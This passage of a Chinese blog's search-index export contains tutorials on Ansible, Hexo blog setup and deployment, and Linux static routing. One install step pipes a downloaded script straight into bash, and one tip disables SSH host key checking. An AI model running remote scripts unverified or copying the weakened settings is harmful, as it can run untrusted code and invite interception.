    <content type="text"><![CDATA[实验环境：主控机：192.168.1.9(centos 7.5)被控机：192.168.1.8(centos 7.5);192.168.1.7(centos 7.4);192.168.1.6(cnetos 6.9)虚拟机：vmware 14做ansible实验前，必须做好主控机的基于被控机的key验证登录具体参照前面的博文中的基于key验证。 ansible特性模块化：调用特定的模块，完成特定任务有Paramiko，PyYAML，Jinja2（模板语言）三个关键模块支持自定义模块基于Python语言实现部署简单，基于python和SSH(默认已安装)，agentless安全，基于OpenSSH支持playbook编排任务幂等性：一个任务执行1遍和执行n遍效果一样，不因重复执行带来意外情况无需代理不依赖PKI（无需ssl）可使用任何编程语言写模块YAML格式，编排任务，支持丰富的数据结构较强大的多层解决方案 主要组成123456ANSIBLE PLAYBOOKS：任务剧本（任务集），编排定义Ansible任务集的配置文件，由Ansible顺序依次执行，通常是JSON格式的YML文件INVENTORY：Ansible管理主机的清单/etc/anaible/hostsMODULES：Ansible执行命令的功能模块，多数为内置核心模块，也可自定义PLUGINS：模块功能的补充，如连接类型插件、循环插件、变量插件、过滤插件等，该功能不常用API：供第三方程序调用的应用程序编程接口ANSIBLE：组合INVENTORY、API、MODULES、PLUGINS的绿框，可以理解为是ansible命令工具，其为核心执行工具 Ansible命令执行来源：1234USER，普通用户，即SYSTEM ADMINISTRATORCMDB（配置管理数据库） API 调用PUBLIC/PRIVATE CLOUD API调用USER-&gt; Ansible Playbook -&gt; Ansibile 利用ansible实现管理的方式：123Ad-Hoc 即ansible命令，主要用于临时命令使用场景Ansible-playbook 主要用于长期规划好的，大型项目的场景，需要有前提的规划 Ansible-playbook（剧本）执行过程：123将已有编排好的任务集写入Ansible-Playbook通过ansible-playbook命令分拆任务集至逐条ansible命令，按预定规则逐条执行 ansible主要操作对象：12HOSTS主机NETWORKING网络设备 注意事项12345执行ansible的主机一般称为主控端，中控，master或堡垒机主控端Python版本需要2.6或以上被控端Python版本小于2.4需要安装python-simplejson被控端如开启SELinux需要安装libselinux-pythonwindows不能做为主控端 安装ansiblerpm包安装: EPEL源1yum install ansible 编译安装:1234567yum -y install python-jinja2 PyYAML python-paramiko python-babel python-cryptotar xf ansible-1.5.4.tar.gzcd ansible-1.5.4python setup.py buildpython setup.py installmkdir /etc/ansiblecp -r examples/* /etc/ansible Git方式:123git clone git://github.com/ansible/ansible.git --recursivecd ./ansiblesource ./hacking/env-setup pip安装： pip是安装Python包的管理器，类似yum1234yum install python-pip python-develyum install gcc glibc-devel zibl-devel rpm-bulid openssl-develpip install --upgrade pippip install ansible --upgrade 确认安装： ansible –version 相关文件说明配置文件123/etc/ansible/ansible.cfg 主配置文件，配置ansible工作特性;建议去掉# host_key_checking = False ;disabled SSH key host checking；前提基于key验证/etc/ansible/hosts 主机清单/etc/ansible/roles/ 存放角色的目录 程序123456/usr/bin/ansible 主程序，临时命令执行工具/usr/bin/ansible-doc 查看配置文档，模块功能查看工具/usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台/usr/bin/ansible-playbook 定制自动化任务，编排剧本工具/usr/bin/ansible-pull 远程执行命令的工具/usr/bin/ansible-vault 文件加密工具/usr/bin/ansible-console 基于Console界面与用户交互的执行工具 hosts清单123456789101112131415161718# Ex 1: Ungrouped hosts, specify before any group headers.## green.example.com## blue.example.com## 192.168.100.1## 192.168.100.10# Ex 2: A collection of hosts belonging to the &apos;webservers&apos; group## [webservers]## alpha.example.org## beta.example.org## 192.168.1.100:9527 #如果此被控机ssh端口为9527，则加一项## 192.168.1.110# Here&apos;s another example of host ranges, this time there are no# leading 0s:## db-[99:101]-node.example.com 例如：12ansible all -m shell -a &apos;cat /etc/fstab&apos; #查看主机清单里所有主机的/etc/fstab文件ansible webservers -m shell -a &apos;cat /etc/fstab&apos; #查看主机清单里wenservers中主机的/etc/fstab文件 ansible相关命令Ansible系列命令1234567ansible ansible-doc ansible-playbook ansible-vaultansible-console ansible-galaxy ansible-pullansible-doc: 显示模块帮助ansible-doc [options] [module...]-a 显示所有模块的文档-l, --list 列出可用模块-s, --snippet显示指定模块的playbook片段 示例：123ansible-doc –l 列出所有模块ansible-doc ping 查看指定模块帮助用法ansible-doc –s ping 查看指定模块帮助用法 命令行1234567891011ansible &lt;host-pattern&gt; [-m module_name] [-a args]--version 显示版本-m module 指定模块，默认为command-v 详细过程 –vv -vvv更详细--list-hosts 显示主机列表，可简写—list-k, --ask-pass 提示输入ssh连接密码，默认Key验证-K, --ask-become-pass 提示输入sudo时的口令-C, --check 检查，并不执行-T, --timeout=TIMEOUT 执行命令的超时时间，默认10s-u, --user=REMOTE_USER 执行远程执行的用户-b, --become 代替旧版的sudo 切换 ansible命令执行过程 加载自己的配置文件 默认/etc/ansible/ansible.cfg 加载自己对应的模块文件，如command 通过ansible将模块或命令生成对应的临时py文件，并将该 文件传输至远程服务器的对应执行用户$HOME/.ansible/tmp/ansible-tmp-数字/XXX.PY文件 给文件+x执行 执行并返回结果 删除临时py文件，sleep 0退出 执行状态： 绿色：执行成功并且不需要做改变的操作 ×××：执行成功并且对目标主机做变更 红色：执行失败 ansible常用模块Command：在远程主机执行命令，默认模块，可忽略-m选项123ansible srvs -m command -a &apos;service vsftpd start&apos;ansible srvs -m command -a &apos;echo password |passwd --stdin user&apos; #不成功，此命令不支持 $VARNAME &lt; &gt; | ; &amp; 等，用shell模块实现 Shell：和command相似，用shell执行命令12ansible srvs -m shell -a &apos;echo password |passwd –stdin user&apos;#调用bash执行命令 类似 cat /tmp/stanley | awk -F&apos;|&apos; &apos;&#123;print $1,$2&#125;&apos; &amp;&gt;/tmp/example.txt 这些复杂命令，即使使用shell也可能会失败，解决办法：写到脚本时，copy到远程，执行，再把需要的结果拉回执行命令的机器 Script：运行脚本12-a &quot;/PATH/TO/SCRIPT_FILE&quot;asnsible websrvs -m script -a f1.sh Copy:从服务器复制文件到客户端,123 ansible srvs -m copy -a &quot;src=/root/f1.sh dest=/tmp/f2.sh owner=user mode=600 backup=yes&quot;#如目标存在，默认覆盖，此处指定先备份 ansible srvs -m copy -a &quot;content=&apos;test content\n&apos; dest=/tmp/f1.txt&quot; # 利用内容，直接生成目标文件 Fetch:从客户端取文件至服务器端，copy相反，目录可先tar1ansible srvs -m fetch -a &apos;src=/root/a.sh dest=/data/scripts&apos; File：设置文件属性12ansible srvs -m file -a &quot;path=/root/a.sh owner=user mode=755&quot;ansible web -m file -a &apos;src=/app/testfile dest=/app/testfile-link state=link&apos; Hostname：管理主机名1ansible node1 -m hostname -a &quot;name=websrv&quot; Cron：计划任务1234#支持时间：minute，hour，day，month，weekdayansible srvs -m cron -a &quot;minute=*/5 job=&apos;/usr/sbin/ntpdate 172.16.0.1 &amp;&gt;/dev/null&apos;name=Synctime&quot; #创建任务ansible srvs -m cron -a &apos;state=absent name=Synctime&apos; #删除任务 Yum：管理包12ansible srvs -m yum -a &apos;name=httpd state=latest&apos; #安装ansible srvs -m yum -a &apos;name=httpd state=absent&apos; #删除 Ansible-vault12345678功能：管理加密解密yml文件ansible-vault [create|decrypt|edit|encrypt|rekey|view]ansible-vault encrypt hello.yml 加密ansible-vault decrypt hello.yml 解密ansible-vault view hello.yml 查看ansible-vault edit hello.yml 编辑加密文件ansible-vault rekey hello.yml 修改口令ansible-vault create new.yml 创建新文件 playbookplaybook是由一个或多个“play”组成的列表play的主要功能在于将事先归并为一组的主机装扮成事先通过ansible中的task定义好的角色。从根本上来讲，所谓task无非是调用ansible的一个module。将多个play组织在一个playbook中，即可以让它们联同起来按事先编排的机制同唱一台大戏Playbook采用YAML语言编写 YAML介绍YAML是一个可读性高的用来表达资料序列的格式。YAML参考了其他多种语言，包括：XML、C语言、Python、Perl以及电子邮件格式RFC2822等。Clark Evans在2001年在首次发表了这种语言，另外Ingy döt Net与Oren Ben-Kiki也是这语言的共同设计者YAML Ain’t Markup Language，即YAML不是XML。不过，在开发的这种语言时，YAML的意思其实是：”Yet Another Markup Language”（仍是一种标记语言）特性YAML的可读性好YAML和脚本语言的交互性好YAML使用实现语言的数据类型YAML有一个一致的信息模型YAML易于实现YAML可以基于流来处理YAML表达能力强，扩展性好更多的内容及规范参见yaml playbook与shell脚本SHELL脚本123456789#!/bin/bash# 安装Apacheyum install --quiet -y httpd# 复制配置文件cp /tmp/httpd.conf /etc/httpd/conf/httpd.confcp/tmp/vhosts.conf /etc/httpd/conf.d/# 启动Apache，并设置开机启动service httpd startchkconfig httpd on Playbook定义12345678910---- hosts: alltasks:- name: &quot;安装Apache&quot;yum: name=httpd- name: &quot;复制配置文件&quot;copy: src=/tmp/httpd.conf dest=/etc/httpd/conf/copy: src=/tmp/vhosts.conf dest=/etc/httpd/conf.cd/- name: &quot;启动Apache，并设置开机启动&quot;service: name=httpd state=started enabled=yes palybook变量 变量名：仅能由字母、数字和下划线组成，且只能以字母开头 变量来源： 1 ansible setup facts 远程主机的所有变量都可直接调用 2 在/etc/ansible/hosts中定义普通变量：主机组中主机单独定义，优先级高于公共变量公共（组）变量：针对主机组中所有主机定义统一变量 3 通过命令行指定变量，优先级最高ansible-playbook –e varname=value4 在playbook中定义123vars:- var1: value1- var2: value2 5 在role中定义 模板templates文本文件，嵌套有脚本（使用模板编程语言编写）Jinja2语言，使用字面量，有下面形式字符串：使用单引号或双引号数字：整数，浮点数列表：[item1, item2, …]元组：(item1, item2, …)字典：{key1:value1, key2:value2, …}布尔型：true/false算术运算：+, -, *, /, //, %, **比较操作：==, !=, &gt;, &gt;=, &lt;, &lt;=逻辑运算：and, or, not流表达式：For If When 1234tasks:- name: install conf file to centos7 template: src=nginx.conf.c7.j2 when: ansible_distribution_major_version == &quot;7&quot; 示例：for.yml123456789101112131415161718--- - hosts: all remote_user: root vars: ports: - listen_port: 81 name: web1 rootdir: web1.com - listen_port: 82 name: web2 rootdir: web2.com - listen_port: 83 name: web3 rootdir: web3.com tasks: - name: copy templates conf template: src=forif.conf.j2 dest=/data/forif.conf templates/for.conf.j21234567&#123;% for p in ports %&#125; server&#123; listen &#123;&#123; p.listen_port &#125;&#125; name &#123;&#123; p.name &#125;&#125; rootdir &#123;&#123; p.rootdir &#125;&#125;&#125;&#123;% endfor %&#125; rolesrolesansilbe自1.2版本引入的新特性，用于层次性、结构化地组织playbook。roles能够根据层次型结构自动装载变量文件、tasks以及handlers等。要使用roles只需要在playbook中使用include指令即可。简单来讲，roles就是通过分别将变量、文件、任务、模板及处理器放置于单独的目录中，并可以便捷地include它们的一种机制。角色一般用于基于主机构建服务的场景中，但也可以是用于构建守护进程等场景中复杂场景：建议使用roles，代码复用度高变更指定主机或主机组如命名不规范维护和传承成本大某些功能需多个Playbook，通过Includes即可实现下面的nginx的roles，可通过下载1ansible-galaxy install geerlingguy.nginx ansible的其他应用亲参考 ansible galaxygithubansiblegithub ansible]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo进阶]]></title>
    <url>%2Fhexo-Developed.html</url>
    <content type="text"><![CDATA[hexo部署命令常用命令12345678]#hexo help #查看帮助]#hexo init #初始化一个目录]#hexo new &quot;postName&quot; #新建文章]#hexo new page &quot;pageName&quot; #新建页面]#hexo generate #生成网页，可以在 public 目录查看整个网站的文件]#hexo server #本地预览，&apos;Ctrl+C&apos;关闭]#hexo deploy #部署.deploy目录]#hexo clean #清除缓存，**强烈建议每次执行命令前先清理缓存，每次部署前先删除 .deploy 文件夹** 常用简写命令123456]#hexo n == hexo new]#hexo g == hexo generate]#hexo s == hexo server]#hexo d == hexo deploy]#hexo d -g #生成加部署]#hexo s -g #预览部署 _config.yml全局配置1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071]#vim ~/hexo/_config.yml# Hexo Configuration# Docs: http://hexo.io/docs/configuration.html# Source: https://github.com/hexojs/hexo/# Site #站点信息title: #标题subtitle: #副标题description: #站点描述，给搜索引擎看的author: #作者email: #电子邮箱language: zh-CN #语言# URL #链接格式url: #网址root: / #根目录permalink: :year/:month/:day/:title/ #文章的链接格式tag_dir: tags #标签目录archive_dir: archives #存档目录category_dir: categories #分类目录code_dir: downloads/codepermalink_defaults:# Directory #目录source_dir: source #源文件目录public_dir: public #生成的网页文件目录# Writing #写作new_post_name: :title.markdown #新文章标题default_layout: post #默认的模板，包括 post、page、photo、draft（文章、页面、照片、草稿）titlecase: false #标题转换成大写external_link: true #在新选项卡中打开连接filename_case: 0render_drafts: falsepost_asset_folder: falserelative_link: falsehighlight: #语法高亮 enable: true #是否启用 line_number: true #显示行号 tab_replace:# Category &amp; Tag #分类和标签default_category: uncategorized #默认分类category_map:tag_map:# Archives2: 开启分页1: 禁用分页0: 全部禁用archive: 2category: 2tag: 2# Server #本地服务器port: 4000 #端口号server_ip: localhost #IP 地址logger: falselogger_format: dev# Date / Time format #日期时间格式date_format: YYYY-MM-DD #参考http://momentjs.com/docs/#/displaying/format/time_format: H:mm:ss# Pagination #分页per_page: 10 #每页文章数，设置成 0 禁用分页pagination_dir: page# Disqus #Disqus评论，替换为多说disqus_shortname:# Extensions #拓展插件theme: landscape-plus #主题exclude_generator:plugins: #插件，例如生成 RSS 和站点地图的- hexo-generator-feed- hexo-generator-sitemap# Deployment #部署，deploy: type: git repo: 刚刚github创库地址.git branch: master blog创建及部署创建关于/分类/标签页面 about categories tags 12345678910]#hexo new &quot;我的第一篇博客&quot;]#hexo n page &apos;about&apos;]#hexo new &quot;Ansible&quot;]#hexo new &apos;safe&apos;]#hexo n page &apos;categories&apos;]#vim ~/source/categories/index.markdowntype: &quot;categories&quot;]#hexo n page &apos;tags&apos;]#vim ~/source/tags/index.markdowntype: &quot;tags&quot; 打赏页面123456]#vim ~/themes/next/_config.yml #Rewardreward_comment: 觉得有帮助可以支持作者wechatpay: /images/wechatpay.jpg #相对路径或者绝对路径alipay: /images/alipay.jpg#bitcoin: /images/bitcoin.png 背景线条打开：~/theme/next/layout/_layout.swig 在 &lt; /body&gt;之前添加代码(注意不要放在&lt; /head&gt;的后面) 123&#123;% if theme.canvas_nest %&#125;&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;&gt;&lt;/script&gt;&#123;% endif %&#125; 打开：~/theme/next/_config.yml ,改成true 12# --------------------------------------------------------------canvas_nest: true 如过觉得线条多的话， 重新编辑next/layout/_layout.swig 1234&#123;% if theme.canvas_nest %&#125;&lt;script type=&quot;text/javascript&quot;color=&quot;0,0,255&quot; opacity=&apos;0.7&apos; zIndex=&quot;-2&quot; count=&quot;99&quot; src=&quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js&quot;&gt;&lt;/script&gt;&#123;% endif %&#125; 配置项说明 color ：线条颜色, 默认: &#39;0,0,0&#39;；三个数字分别为(R,G,B) opacity: 线条透明度（0~1）, 默认: 0.5 count: 线条的总数量, 默认: 150 zIndex: 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1 页面点击出红心在网址输入如下 1http://7u2ss1.com1.z0.glb.clouddn.com/love.js 然后将里面的代码copy一下vim ~/themes/next/source/js/src/love.js，添加上面的代码，然后打开vim ~/themes/next/layout/_layout.swig文件,在末尾添加以下代码： 12&lt;!-- 页面点击小红心 --&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/love.js&quot;&gt;&lt;/script&gt; 左侧链接栏 auto_excerpt:不显示全文页 1234]#vim ~/themes/next/_config.ymlauto_excerpt: enable: ture length: 150 busuanzi_count:显示浏览量及访问量 12345678910111213141516]#vim ~/themes/next/_config.ymlbusuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 访问人数 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;&lt;/i&gt; 总访问量 site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;&lt;/i&gt; 浏览 page_pv_footer: 次 social: 链接栏 123456789101112131415]#vim ~/themes/next/_config.ymlsocial: GitHub: https://github.com/oldthreefeng || github #E-Mail: mailto:louisehong4168@gmail.com || Mail #Google: https://plus.google.com/yourname || google #Twitter: https://twitter.com/yourname || twitter #FB Page: https://www.facebook.com/yourname || facebook #VK Group: https://vk.com/yourname || vk #StackOverflow: https://stackoverflow.com/yourname || stack-overflow #YouTube: https://youtube.com/yourname || youtube Instagram: https://instagram.com/louisehong4168 || instagram #Skype: skype:yourname?call|chat || skypesocial_icons: enable: true links：友情链接 12345678]#vim ~/themes/next/_config# Blog rollslinks_icon: linklinks_title: 看看他们links_layout: block#links_layout: inlinelinks: Awesome: https://fontawesome.com/icons 小图标 字数统计功能在根目录下安装 hexo-wordcount,运行： 1]# npm install hexo-wordcount --save 然后在主题的配置文件themes/next/_config.yml中，配置如下： 123456# Post wordcount display settings# Dependencies: https://github.com/willin/hexo-wordcountpost_wordcount: item_text: true wordcount: true min2read: true 报错搭建过程中出现了几个报错，统计了一下 异常报错1fatal: unable to access : Empty reply from serverFATAL Something’s wrong. Maybe you can find the solution here:Error: fatal: unable to access ：Empty reply from server 1]#hexo clean 异常报错2ERROR Deployer not found: git12345678910]#npm install hexo-generator-index --save]#npm install hexo-generator-archive --save]#npm install hexo-generator-category --save]#npm install hexo-generator-tag --save]#npm install hexo-server --save]#npm install hexo-deployer-git --save]#npm install hexo-renderer-marked@0.2 --save]#npm install hexo-renderer-stylus@0.2 --save]#npm install hexo-generator-feed@1 --save]#npm install hexo-generator-sitemap@1 --save 总结：前前后后话了两天初步搭建起来，查看了很多的大神blog，最后也成功了，比较开心 详细参见距离博文]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo安装使用]]></title>
    <url>%2Fhexo-install.html</url>
    <content type="text"><![CDATA[hexo初识及准备 Hexo是一个简单、快速、强大的基于 Github Pages 的博客框架，支持Markdown格式，有众多优秀插件和主题。 由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。 有一个github账号，没有的话去注册一个；创建repository：userid.github.io 安装了git ,linux自带git，然后在github上实现基于key的验证。 Hexo依赖于Node.js;git; 重启终端，下载相关的依赖环境123456789]# yum install git-core ]# wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash]# nvm install stable]# npm install -g hexo-cli]# hexo -vhexo: 3.7.1hexo-cli: 1.1.0]# node -vv8.11.2 网站初始化12345678910111213141516171819]# mkdir myblog]# cd myblog]# hexo init #生成博客]# tree ..├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── theme]# hexo g #部署博客INFO Start processingINFO Files loaded in 583 msINFO Generated: index.htmlINFO Generated: archives/index.html···INFO 28 files generated in 1.09 s 更换主题123456789101112131415]# hexo sINFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.]# git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia #换yilia主题，都在hexo家目录执行]# git clone https://github.com/iissnan/hexo-theme-next themes/next #换主题]# vim _config.ymltheme: next]# hexo clean #清缓存]# hexo gINFO Start processing····]# hexo sINFO Start processingINFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.INFO See you again 部署hexo到github123456789101112131415161718192021222324]# vim _config.ymldeploy： type: git repository: https://github.com/oldthreefeng/oldthreefeng.github.io.git branch: master]# hexo dERROR Deployer not found: git]# npm install hexo-deployer-git --save+ hexo-deployer-git@0.3.1added 31 packages in 63.468s]# hexo dINFO Deploying: gitINFO Setting up Git deployment...Initialized empty Git repository in D:/github/hexo/.deploy_git/.git/*** Please tell me who you are.Run]# git config --global user.email &quot;you@example.com&quot;]# git config --global user.name &quot;Your Name&quot;]# hexo d···Branch &apos;master&apos; set up to track remote branch &apos;master&apos; from &apos;https://github.com/oldthreefeng/oldthreefeng.github.io.git&apos;.To https://github.com/oldthreefeng/oldthreefeng.github.io.git + 930f090...4f24ee0 HEAD -&gt; master (forced update)INFO Deploy done: git 至此，部署成功，访问https://userid.github.io ,userid是你的github账户用户名。 6.创建第一篇博文12345678910111213]#vim _config.ymltitle: Feng&apos;s Blogsubtitle: 山不在高，有仙则名；水不在深，有龙则灵。description: Linux Learningkeywords:author: Hong Fenglanguage: zh-Hanstimezone:]# rm -f source/_posts/*]# cd public/2018/06/05/]# rm -rf hello-world/]# hexo new &quot;我的第一篇博文&quot;]# hexo g 本文参考 1.浅陌博文 2.hexo官网 ​]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux下路由配置梳理]]></title>
    <url>%2Froute.html</url>
    <content type="text"><![CDATA[摘要：路由的基本知识；路由的配置；路由的相关实验 路由的基础知识在日常运维作业中，经常会碰到路由表的操作。下面就linux运维中的路由操作做一梳理：——————————————————————————先说一些关于路由的基础知识： 路由概念路由： 跨越从源主机到目标主机的一个互联网络来转发数据包的过程路由器：能够将数据包转发到正确的目的地，并在转发过程中选择最佳路径的设备路由表：在路由器中维护的路由条目，路由器根据路由表做路径选择直连路由：当在路由器上配置了接口的IP地址，并且接口状态为up的时候，路由表中就出现直连路由项静态路由：是由管理员手工配置的，是单向的。默认路由：当路由器在路由表中找不到目标网络的路由条目时，路由器把请求转发到默认路由接口 。 静态路由和默认路由的特点静态路由特点:路由表是手工设置的；除非网络管理员干预，否则静态路由不会发生变化；路由表的形成不需要占用网络资源；适用环境：一般用于网络规模很小、拓扑结构固定的网络中。 默认路由特点: 在所有路由类型中，默认路由的优先级最低适用环境：一般应用在只有一个出口的末端网络中或作为其他路由的补充 浮动静态路由： 路由表中存在相同目标网络的路由条目时，根据路由条目优先级的高低，将请求转发到相应端口；链路冗余的作用； 路由器转发数据包时的封装过程 源IP和目标IP不发生变化，在网络的每一段传输时，源和目标MAC发生变化，进行重新封装，分别是每一段的源和目标地址 要完成对数据包的路由，一个路由器必须至少了解以下内容： a）目的地址 b）相连路由器，并可以从哪里获得远程网络的信息 c）到所有远程网络的可能路由 d）到达每个远程网络的最佳路由 e）如何维护并验证路由信息 f）路由和交换的对比 路由工作在网络层 a)根据“路由表”转发数据b)路由选择c)路由转发 交换工作在数据链路层 d)根据“MAC地址表”转发数据e)硬件转发 路由的命令 使用route -n命令查看Linux内核路由表 1234567]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface0.0.0.0 172.20.0.1 0.0.0.0 UG 100 0 0 ens37172.20.0.0 0.0.0.0 255.255.0.0 U 100 0 0 ens37192.168.1.0 0.0.0.0 255.255.255.0 U 100 0 0 ens33192.168.122.0 0.0.0.0 255.255.255.0 U 0 0 0 virbr0 三种路由类型说明 主机路由 主机路由是路由选择表中指向单个IP地址或主机名的路由记录。主机路由的Flags字段为H。例如，在下面的示例中，本地主机通过IP地址192.168.1.1的路由器到达IP地址为10.0.0.10的主机。 123Destination Gateway Genmask Flags Metric Ref Use Iface----------- ------- ------- ----- ------ --- --- -----10.0.0.10 192.168.1.1 255.255.255.255 UH 0 0 0 eth0 网络路由 网络路由是代表主机可以到达的网络。网络路由的Flags字段为N。例如，在下面的示例中，本地主机将发送到网络192.19.12的数据包转发到IP地址为192.168.1.1的路由器。 123Destination Gateway Genmask Flags Metric Ref Use Iface----------- ------- ------- ----- ----- --- --- -----192.19.12 192.168.1.1 255.255.255.0 UN 0 0 0 eth0 默认路由当主机不能在路由表中查找到目标主机的IP地址或网络路由时，数据包就被发送到默认路由（默认网关）上。默认路由的Flags字段为G。例如，在下面的示例中，默认路由是IP地址为192.168.1.1的路由器。 123Destination Gateway Genmask Flags Metric Ref Use Iface----------- ------- ------- ----- ------ --- --- -----default 192.168.1.1 0.0.0.0 UG 0 0 0 eth0 配置路由route的命令设置和查看路由表都可以用 route 命令，设置内核路由表的命令格式是： 1route [add|del] [-net|-host] target [netmask Nm] [gw Gw] [[dev] If] 参数解释： 12345678add 添加一条路由规则del 删除一条路由规则-net 目的地址是一个网络-host 目的地址是一个主机target 目的网络或主机netmask 目的地址的网络掩码gw 路由数据包通过的网关dev 为路由指定的网络接口 route命令使用举例 1234567891011121314151617181920212223242526272829303132333435添加到主机的路由]# route add -host 192.168.1.2 dev eth0:0]# route add -host 10.20.30.148 gw 10.20.30.40 添加到网络的路由]# route add -net 10.20.30.40 netmask 255.255.255.248 eth0]# route add -net 10.20.30.48 netmask 255.255.255.248 gw 10.20.30.41]# route add -net 192.168.1.0/24 eth1 添加默认路由]# route add default gw 192.168.1.1 删除路由]# route del -host 192.168.1.2 dev eth0:0]# route del -host 10.20.30.148 gw 10.20.30.40]# route del -net 10.20.30.40 netmask 255.255.255.248 eth0]# route del -net 10.20.30.48 netmask 255.255.255.248 gw 10.20.30.41]# route del -net 192.168.1.0/24 eth1]# route del default gw 192.168.1.1 //route del default 删除所有的默认路由 添加一条默认路由]# route add default gw 10.0.0.1 //默认只在内存中生效开机自启动可以追加到/etc/rc.local文件里]# echo &quot;route add default gw 10.0.0.1&quot; &gt;&gt;/etc/rc.local 添加一条静态路由]# route add -net 192.168.2.0/24 gw 192.168.2.254要永久生效的话要这样做：]# echo &quot;any net 192.168.2.0/24 gw 192.168.2.254&quot; &gt;&gt;/etc/sysconfig/static-routes 添加到一台主机的静态路由]# route add -host 192.168.2.2 gw 192.168.2.254要永久生效的话要这样做：]# echo &quot;any host 192.168.2.2 gw 192.168.2.254 &quot; &gt;&gt;/etc/sysconfig/static-routes注：Linux 默认没有这个文件 ，得手动创建一个 设置包转发 在Linux中默认的内核配置已经包含了路由功能，但默认并没有在系统启动时启用此功能；开启Linux的路由功能可以通过调整内核的网络参数来实现，方法如下： 12345678 临时开启路由功能：# echo 1 &gt; /proc/sys/net/ipv4/ip_forward或者# sysctl -w net.ipv4.ip_forward=1 永久开启路由功能# vim /etc/sysctl.confnet.ipv4.ip_forward = 1# sysctl -p 静态路由配置 添加静态路由到路由表的语法如下： 1ip route [destination_network] [mask] [next-hop_address] administrative_distance] 参数解析： 123456ip route 用于创建静态路由的命令。Destination_network 需要发布到路由表中的网段。Mask 在这一网络上使用的子网掩码。Next-hop_address 下一跳路由器的地址。administrative_distance 默认时，静态路由有一个取值为1 的管理性距离。在这个命令的尾部添加管理权来修改这个默认值。 例如: 1ip route 172.16.1.0 255.255.255.0 172.16.2.1 查看路由表除了使用route -n命令外，还可以使用ip route 12345]# ip routedefault via 172.20.0.1 dev ens37 proto static metric 101 172.20.0.0/16 dev ens37 proto kernel scope link src 172.20.5.24 metric 101 172.20.0.24 dev ens37 scope link src 172.20.0.24 192.168.1.0/24 dev ens33 proto kernel scope link src 192.168.1.18 metric 100 实例实例1 如上图所示，PC0机器和PC1机器之间经过两个路由器，要想使这两台机器通信，路由设置如下：1）Route1路由器设置： 1234]# ip add 192.168.1.1 255.255.255.0]# ip add 192.168.2.1 255.255.255.0]# ip route 192.168.3.0 255.255.255.0 192.168.2.2]# echo 1 &gt; /proc/sys/net/ipv4/ip_forward 2）Route2路由器设置： 1234]# ip add 192.168.2.2 255.255.255.0]# ip add 192.168.3.1 255.255.255.0]# ip route 192.168.1.0 255.255.255.0 192.168.2.1]# echo 1 &gt; /proc/sys/net/ipv4/ip_forward 实例2 如上图所示，使用A主机192.168.1.2能够ping通E主机192.168.4.2，这两台机能够通信。 操作思路： 在主机B上设置默认路由下一跳为192.168.2.2，并开启路由转发功能； 在主机C上设置2条静态路由，分别去192.168.1.0/24网段的下一跳为192.168.2.1，去192.168.4.0/24网段的下一跳为192.168.3.2，并开启路由转发功能； 在主机D上设置默认路由下一跳为192.168.3.1，并开启路由转发功能。 操作记录： 1234567891011121314151617181920212223242526272829303132333435361）A主机上操作：ip为192.168.1.2，设置网关为192.168.1.1]# route add default gw 192.168.1.1 2）B主机上操作：第一块网卡为192.168.1.1，第二块网卡为192.168.2.1]# ifconfig eth0 192.168.1.1]# ifconfig eth1 192.168.2.1 //可以在一块网卡上设置两个ip，比如是eth0，eth0:0 B主机设置默认路由，下一跳为192.168.2.2]# route add default gw 192.168.2.2 B主机开启路由转发功能]# echo 1 &gt; /proc/sys/net/ipv4/ip_forward //临时转发，可以在/etc/sysctl.conf里设置永久转发 3）C主机上操作：第一块网卡为192.168.2.2，第二块网卡为192.168.3.1]# ifconfig eth0 192.168.2.2]# ifconfig eth1 192.168.3.1 //如果就一块网卡，可以设置ifconfig eth0:0 192.168.3.1 C主机设置2条默认路由]# route add -net 192.168.1.0/24 gw 192.168.2.1]# route add -net 192.168.4.0/24 gw 192.168.3.2 C主机开启路由转发功能]# echo 1 &gt; /proc/sys/net/ipv4/ip_forward 4）D主机上操作：第一块网卡为192.168.3.2，第二块网卡为192.168.4.1]# ifconfig eth0 192.168.3.2]# ifconfig eth1 192.168.4.1 D主机设置默认路由，下一跳为192.168.3.1]# route add default gw 192.168.3.1 D主机开启路由转发功能]# echo 1 &gt; /proc/sys/net/ipv4/ip_forward 5）E主机上操作：ip为192.168.4.2，设置网关为192.168.4.1]# route add default gw 192.168.4.1]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
</search>
